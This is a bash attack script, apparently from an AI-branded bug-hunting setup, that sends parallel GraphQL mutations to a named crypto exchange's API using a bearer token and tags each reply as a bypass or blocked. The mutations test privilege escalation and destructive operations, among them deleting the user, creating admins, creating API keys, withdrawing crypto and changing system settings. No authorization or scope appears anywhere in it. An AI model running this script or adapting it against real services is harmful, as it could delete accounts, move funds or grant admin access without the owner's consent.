#!/bin/bash
# ClaudeOS Wolf Pack — Parallel GraphQL Mutation Tester
# Usage: ./wolf-pack.sh <token> <target_url>

TOKEN="$1"
TARGET="${2:-https://exchange-api.bumba.global/graphql}"
EVIDENCE="/opt/claudeos-hunt/evidence/$(date +%Y%m%d-%H%M%S)-wolfpack.txt"

echo "=== WOLF PACK DEPLOYED — $(date -u) ===" | tee "$EVIDENCE"
echo "Target: $TARGET" | tee -a "$EVIDENCE"

test_mutation() {
    local name="$1"
    local query="$2"
    local resp=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $TOKEN" \
        -d "{\"query\":\"$query\"}" 2>/dev/null)
    local body=$(echo "$resp" | head -n -1)
    local code=$(echo "$resp" | tail -1)
    
    local guard=$(echo "$body" | grep -o "PERMS_GUARD" 2>/dev/null)
    local status="BYPASS"
    [ -n "$guard" ] && status="BLOCKED"
    
    echo "[$status] $name → HTTP $code | $(echo $body | head -c 120)" | tee -a "$EVIDENCE"
}

# Deploy all wolves in parallel (max 5 concurrent)
test_mutation "create_order" "mutation { create_order(instrument_id: \\\"BTCUSDT\\\", side: buy, type: limit, quantity: 0.0001, time_in_force: gtc, price: 60000) { __typename } }" &
test_mutation "create_conversion_quote" "mutation { create_conversion_quote(source_currency_id: \\\"BTC\\\", target_currency_id: \\\"USDT\\\", source_currency_amount: 0.001) { conversion_quote_id price } }" &
test_mutation "update_user" "mutation { update_user(full_name: \\\"WolfPack\\\") { user_id full_name } }" &
test_mutation "delete_user" "mutation { delete_user }" &
test_mutation "send_push" "mutation { send_push(title: \\\"test\\\", body: \\\"test\\\", message: \\\"test\\\") }" &
wait

test_mutation "create_api_key" "mutation { create_api_key(permissions: [create_order], expires_at: \\\"2027-01-01\\\", is_active: on, type: trader) { __typename } }" &
test_mutation "create_withdrawal_crypto" "mutation { create_withdrawal_crypto(currency_id: \\\"BTC\\\", amount: 0.001, crypto_address: \\\"bc1qtest\\\") { __typename } }" &
test_mutation "create_admins" "mutation { create_admins(emails: [\\\"test@test.com\\\"], subjects: [\\\"test\\\"]) }" &
test_mutation "update_system_settings" "mutation { update_system_settings { __typename } }" &
test_mutation "create_instrument" "mutation { create_instrument(symbol: \\\"TESTUSDT\\\") { __typename } }" &
wait

echo "" | tee -a "$EVIDENCE"
echo "=== PACK COMPLETE — $(date -u) ===" | tee -a "$EVIDENCE"
echo "Evidence: $EVIDENCE"
